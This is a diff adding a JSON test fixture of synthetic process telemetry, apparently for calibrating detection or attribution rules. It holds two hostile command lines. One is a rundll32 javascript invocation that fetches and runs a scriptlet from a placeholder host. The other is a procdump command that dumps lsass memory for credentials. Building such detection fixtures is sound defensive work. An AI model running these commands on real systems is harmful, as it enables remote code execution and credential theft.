@@ -1,0 +1,39 @@
+{
+  "fixture_id": "v1-cal-disputed-campaign",
+  "description": "Declared-provenance SYNTHETIC v1 scenario for family 'v1-cal-disputed-campaign' (role=calibration). Tier-1 machinery only; NOT real-world accuracy evidence. Raw telemetry only; labels live in annotations/. Replays via fixtures/phase1_core_rules.json (unmodified) + the Stage 2 calibration evidence-type rule pack to one attribution unit.",
+  "scenarios": [
+    {
+      "scenario_id": "cd1",
+      "raw_record": {
+        "record_id": "rec-cd1",
+        "timestamp": "2026-09-01T09:00:00+00:00",
+        "observation_id": "obs-cd1"
+      },
+      "process": {
+        "name": "rundll32.exe",
+        "entity_id": "cd1",
+        "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject('script:http://example.invalid/x.sct')"
+      },
+      "host": {
+        "id": "host-cal-disputed"
+      }
+    },
+    {
+      "scenario_id": "cd2",
+      "raw_record": {
+        "record_id": "rec-cd2",
+        "timestamp": "2026-09-01T09:00:05+00:00",
+        "observation_id": "obs-cd2"
+      },
+      "process": {
+        "name": "procdump.exe",
+        "entity_id": "cd2",
+        "command_line": "procdump.exe -ma lsass.exe lsass.dmp",
+        "parent_entity_id": "cd1"
+      },
+      "host": {
+        "id": "host-cal-disputed"
+      }
+    }
+  ]
+}
